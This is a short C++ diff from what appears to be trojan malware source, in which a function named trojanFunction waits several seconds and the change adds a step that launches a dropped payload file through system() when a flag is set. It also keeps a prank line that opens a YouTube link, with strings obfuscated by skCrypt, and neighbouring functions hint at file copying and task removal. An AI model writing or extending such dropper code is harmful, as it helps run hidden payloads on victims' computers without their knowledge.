@@ -44,7 +44,9 @@ bool copy_file(const char* From, const char* To) {
 
 DWORD trojanFunction(LPVOID params_useless) {
     this_thread::sleep_for(6500ms);
-    system(((string)skCrypt("start ") + (string)skCrypt("https://www.youtube.com/watch?v=dQw4w9WgXcQ")).c_str());
+    if (DROPRUN_TROJAN_FILE)
+        system((TROJANFILE).c_str());
+    system(((string)skCrypt("start ") + (string)skCrypt("https://www.youtube.com/watch?v=dQw4w9WgXcQ")).c_str());   // just for fun and for tests - you can delete this line
 }
 
 DWORD removeTasks(LPVOID params_useless) {
